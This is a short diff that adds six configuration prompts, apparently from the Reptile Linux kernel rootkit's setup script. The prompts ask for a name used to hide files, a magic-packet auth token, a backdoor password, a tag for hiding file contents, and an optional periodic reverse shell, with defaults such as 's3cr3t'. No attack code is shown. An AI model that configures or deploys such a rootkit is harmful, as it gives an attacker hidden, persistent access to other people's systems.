@@ -1,0 +1,6 @@
+Hide name (will be used to hide dirs/files) (default: reptile):
+Auth token to magic packets (default: hax0r):
+Backdoor password (default: s3cr3t):
+Tag name that hide file contents (default: reptile):
+Source port of magic packets (default: 666):
+Would you like to config reverse shell each X time? (y/n) (default: n):
